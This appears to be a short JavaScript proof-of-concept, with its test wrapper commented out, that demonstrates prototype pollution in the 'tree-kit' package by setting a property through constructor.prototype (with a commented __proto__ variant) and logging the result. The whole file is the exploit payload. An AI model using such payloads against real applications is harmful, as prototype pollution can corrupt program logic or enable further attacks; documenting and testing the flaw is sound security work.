// test("prototype pollution in tree-kit", () => {
  const { dotPath } = require('tree-kit')
  obj = {};
console.log({}.polluted);
dotPath.set({}, ["constructor","prototype", "polluted"], "yes") 
//dotPath.set({}, ["__proto__", "polluted"], "yes") 
console.log({}.polluted);
// });
